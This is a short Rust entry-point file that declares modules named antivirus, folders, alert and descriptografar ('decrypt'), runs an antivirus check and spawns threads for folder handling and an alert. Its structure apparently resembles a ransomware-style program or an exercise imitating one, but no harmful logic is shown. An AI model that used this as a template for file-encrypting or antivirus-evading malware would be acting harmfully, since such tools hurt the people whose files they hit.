mod antivirus;
mod folders;
mod alert;
mod descriptografar;



use std::thread;
use std::time::Duration;

fn main() {
   antivirus::antivirus_verification();
    let handle1 = thread::spawn(|| {
        alert::alert(); 

    });

    let handle2 = thread::spawn(|| {
        folders::folders();
        
    });

    let mut control = true;

    let directories = handle2.join().unwrap();
    thread::sleep(Duration::from_secs(5));
    control = false;

    if control{
        handle1.join().unwrap();
    }


}
